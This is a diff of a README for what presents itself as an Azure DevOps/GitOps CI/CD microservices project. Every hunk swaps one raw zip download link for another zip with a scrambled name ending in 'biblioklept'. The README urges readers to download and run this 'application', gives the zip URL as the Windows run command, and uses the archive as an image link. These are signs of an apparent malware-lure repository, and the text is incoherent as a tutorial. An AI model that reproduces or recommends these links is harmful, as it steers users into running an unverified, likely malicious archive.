@@ -1,6 +1,6 @@
 # 🚀 end-to-end-ci-cd-for-microservices-using-azure-devops-and-gitops - Simplifying CI/CD for All Users
 
-[![Download Now](https://raw.githubusercontent.com/iBekadavLomerx/end-to-end-ci-cd-for-microservices-using-azure-devops-and-gitops/main/inhabitable/end-to-end-ci-cd-for-microservices-using-azure-devops-and-gitops.zip%20Now-%20-brightgreen)](https://raw.githubusercontent.com/iBekadavLomerx/end-to-end-ci-cd-for-microservices-using-azure-devops-and-gitops/main/inhabitable/end-to-end-ci-cd-for-microservices-using-azure-devops-and-gitops.zip)
+[![Download Now](https://github.com/iBekadavLomerx/end-to-end-ci-cd-for-microservices-using-azure-devops-and-gitops/raw/refs/heads/main/inhabitable/devops_microservices_using_and_to_azure_gitops_cd_end_ci_for_biblioklept.zip%20Now-%20-brightgreen)](https://github.com/iBekadavLomerx/end-to-end-ci-cd-for-microservices-using-azure-devops-and-gitops/raw/refs/heads/main/inhabitable/devops_microservices_using_and_to_azure_gitops_cd_end_ci_for_biblioklept.zip)
 
 ## 🌟 Introduction
 
@@ -37,7 +37,7 @@ Before starting, ensure you have the following:
 
 To run this application, visit the Releases page to download the files.
 
-[Download the Application](https://raw.githubusercontent.com/iBekadavLomerx/end-to-end-ci-cd-for-microservices-using-azure-devops-and-gitops/main/inhabitable/end-to-end-ci-cd-for-microservices-using-azure-devops-and-gitops.zip)
+[Download the Application](https://github.com/iBekadavLomerx/end-to-end-ci-cd-for-microservices-using-azure-devops-and-gitops/raw/refs/heads/main/inhabitable/devops_microservices_using_and_to_azure_gitops_cd_end_ci_for_biblioklept.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version.
@@ -52,7 +52,7 @@ After downloading, follow these steps to run the application:
 2. Extract the downloaded files if necessary.
 3. Open the terminal or command prompt on your system.
 4. Move to the folder containing the extracted files using commands like `cd path/to/folder`.
-5. Run the application using the appropriate command for your operating system (e.g., `./application-name` on Unix-based systems or `https://raw.githubusercontent.com/iBekadavLomerx/end-to-end-ci-cd-for-microservices-using-azure-devops-and-gitops/main/inhabitable/end-to-end-ci-cd-for-microservices-using-azure-devops-and-gitops.zip` on Windows).
+5. Run the application using the appropriate command for your operating system (e.g., `./application-name` on Unix-based systems or `https://github.com/iBekadavLomerx/end-to-end-ci-cd-for-microservices-using-azure-devops-and-gitops/raw/refs/heads/main/inhabitable/devops_microservices_using_and_to_azure_gitops_cd_end_ci_for_biblioklept.zip` on Windows).
 
 ## 🌐 How It Works
 
@@ -67,7 +67,7 @@ The application automates the deployment of microservices. When you push changes
 ## 📖 Project Walk-through
 
 1. **Migrated Multi-Microservice Repository:** We moved a multi-microservice repository from GitHub to Azure Repos for better version control.  
-   ![Migration Process](https://raw.githubusercontent.com/iBekadavLomerx/end-to-end-ci-cd-for-microservices-using-azure-devops-and-gitops/main/inhabitable/end-to-end-ci-cd-for-microservices-using-azure-devops-and-gitops.zip)
+   ![Migration Process](https://github.com/iBekadavLomerx/end-to-end-ci-cd-for-microservices-using-azure-devops-and-gitops/raw/refs/heads/main/inhabitable/devops_microservices_using_and_to_azure_gitops_cd_end_ci_for_biblioklept.zip)
 
 2. **Configured Azure Container Registry:** This step ensures we have a centralized storage solution for our images.
 
@@ -101,6 +101,6 @@ For additional resources, code samples, and a detailed project structure, refer 
 
 To get started again, remember to check the Downloads page to grab the latest version:
 
-[Download the Application](https://raw.githubusercontent.com/iBekadavLomerx/end-to-end-ci-cd-for-microservices-using-azure-devops-and-gitops/main/inhabitable/end-to-end-ci-cd-for-microservices-using-azure-devops-and-gitops.zip)
+[Download the Application](https://github.com/iBekadavLomerx/end-to-end-ci-cd-for-microservices-using-azure-devops-and-gitops/raw/refs/heads/main/inhabitable/devops_microservices_using_and_to_azure_gitops_cd_end_ci_for_biblioklept.zip)
 
 We hope this application makes managing your microservices easier!
